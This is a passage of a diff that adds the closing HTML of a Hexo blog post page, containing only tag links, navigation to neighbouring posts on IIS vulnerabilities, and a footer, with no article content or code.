+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"># 漏洞原理</a>
+                    
+                        <a href="/tags/IIS/"># IIS</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/08/16/IIS-4/">IIS-解析漏洞(上)</a>
+            
+            
+            <a class="next" rel="next" href="/2019/08/02/IIS-2/">IIS-短文件名猜解漏洞</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
